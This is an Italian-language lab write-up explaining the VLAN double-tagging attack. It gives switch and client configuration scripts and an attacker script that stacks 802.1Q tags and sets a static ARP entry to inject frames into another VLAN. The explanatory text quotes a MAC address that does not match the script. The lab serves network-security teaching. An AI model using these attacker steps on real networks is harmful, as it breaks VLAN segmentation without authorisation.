# VLAN: Double Tagging Attack
Il **Double Tagging Attack** prevede che l'attaccante sia connesso tramite un *Trunk Link* ad uno switch, e che possa inviare pacchetti taggati con l'id della native VLAN dello switch. Con queste premesse l'attacco funziona sfruttando il comportamento tipico dello switch di quando deve inoltrare un pacchetto appartenente alla sua native VLAN: il pacchetto viene inoltrato *untagged*. Più precisamente, il tag relativo alla native VLAN, se presente, viene rimosso. L'idea è quindi quella di inviare un pacchetto con due tag: il primo tag deve essere quello della nativa VLAN dello switch, il secondo tag è invece quello della rete VLAN verso cui si vuole inoltrare il pacchetto. Così facendo, il pacchetto ricevuto dallo switch viene manipolato affinché il primo tag venga rimosso, senza sapere che a seguire c'è un ulteriore tag di un'altra VLAN. Il pacchetto che viene inoltrato sarà quindi un pacchetto legale diretto verso una VLAN a cui l'attaccante non appartiene. Osserviamo che questo attacco consente ad un attaccante di inviare pacchetti verso un'altra VLAN, ma non di riceverne.

# Laboratorio
![topology](topology.png)

Partiamo da una topologia simile a quella del laboratorio sulle VLAN. In questo caso togliamo però il router in quanto non vogliamo consentire la comunicazione inter-VLAN. L'attaccante è connesso ad un *Trunk Link*. Lo scopo del laboratorio è quello di simulare un **Double Tagging Attack**, ovvero di inviare pacchetti ad una vittima nella VLAN 20 anche se l'attaccante si trova in un'altra VLAN e la comunicazione inter-VLAN via un IP GW non è consentita.

## Configurazione degli switch

#### Switch 1 (scripts/switch1/setup.sh):
```
ip link add name bridge type bridge
ip link set dev bridge type bridge vlan_filtering 1
ip link set bridge up
ip link set dev eth0 master bridge
ip link set dev eth1 master bridge
ip link set dev eth2 master bridge
ip link set dev eth3 master bridge
bridge vlan add dev eth0 vid 10 pvid untagged
bridge vlan add dev eth1 vid 20 pvid untagged
bridge vlan add dev eth2 vid 10
bridge vlan add dev eth2 vid 20
```

#### Switch 2 (scripts/switch2/setup.sh):
```
ip link add name bridge type bridge
ip link set dev bridge type bridge vlan_filtering 1
ip link set bridge up
ip link set dev eth0 master bridge
ip link set dev eth1 master bridge
ip link set dev eth2 master bridge
bridge vlan add dev eth0 vid 10 pvid untagged
bridge vlan add dev eth1 vid 20 pvid untagged
bridge vlan add dev eth2 vid 10
bridge vlan add dev eth2 vid 20
```


## Configurazione dei client

#### Client 1 (scripts/client1/setup.h):
```
ip link set eth0 up
ip addr add 10.0.10.101/24 dev eth0
ip route add default via 10.0.10.1
```

#### Client 2 (scripts/client2/setup.h):
```
ip link set eth0 up
ip addr add 10.0.20.101/24 dev eth0
ip route add default via 10.0.20.1
```

#### Client 3 (scripts/client3/setup.h):
```
ip link set eth0 up
ip addr add 10.0.10.102/24 dev eth0
ip route add default via 10.0.10.1
```

#### Client 4 (scripts/client4/setup.h):
```
ip link set eth0 up
ip link set dev eth0 address d0:d0:d0:d0:d0:d0
ip addr add 10.0.20.102/24 dev eth0
ip route add default via 10.0.20.1
```

#### Attacker (scripts/attacker/setup.sh):
```
# script for sending double 802.1q frames with 
# native tools on Linux (we can use also scapy..)
ip link add link eth0 name eth0.1 type vlan id 1
ip link set eth0.1 up
ip link add link eth0.1 name eth0.1.20 type vlan id 20
ip link set eth0.1.20 up
ip addr add 10.0.20.250/24 dev eth0.1.20
arp -s 10.0.20.102 d0:d0:d0:d0:d0:d0 -i eth0.1.20 #if mac not known use broadcast MAC
```

Con i comandi precendenti andiamo a creare due interfacce virtuali sull'attaccante:
* ```eth0.1```, con ```id 1```. Questa VLAN ha lo stesso id della *native VLAN* del link tra i due switch.
* ```eth0.1.20```, con ```id 20```. Questa VLAN ha l'id della VLAN target. Questa interfaccia virtuale ha come *parent* l'interfaccia virtuale precedente, in modo tale da permettere il doppio incapsulamento. Il comando ```arp -s 10.0.20.102 a0:a0:a0:a0:a0:a0 -i eth0.1.20``` serve a manipolare la arp cache: si aggiunge il bind tra indirizzo MAC e indirizzo ip specificati sull'interfaccia eth0.1.20. Con il comando arp -a si può effettivamente verificare l'effettivo binding. Si può osservare che, per comodità, si è assegnato un indirizzo MAC statico al client vittima.